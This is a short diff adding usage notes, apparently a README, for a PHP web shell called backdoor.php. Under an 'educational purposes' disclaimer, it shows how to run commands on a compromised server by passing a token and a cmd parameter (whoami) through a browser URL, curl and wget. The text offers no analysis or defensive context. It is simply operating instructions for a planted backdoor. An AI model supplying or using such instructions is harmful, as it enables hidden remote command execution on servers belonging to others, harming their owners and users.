@@ -1,0 +1,12 @@
+Only for Educational purposes. Use with caution.
+
+# Access the backdoor via web browser:
+http://example.com/backdoor.php?token=abc123&cmd=whoami
+
+# Using cURL:
+curl "http://example.com/backdoor.php?token=abc123&cmd=whoami"
+
+# Using wget:
+wget -qO- "http://example.com/backdoor.php?token=abc123&cmd=whoami"
+
+# 'token' is any one of the token defined in the backdoor.php
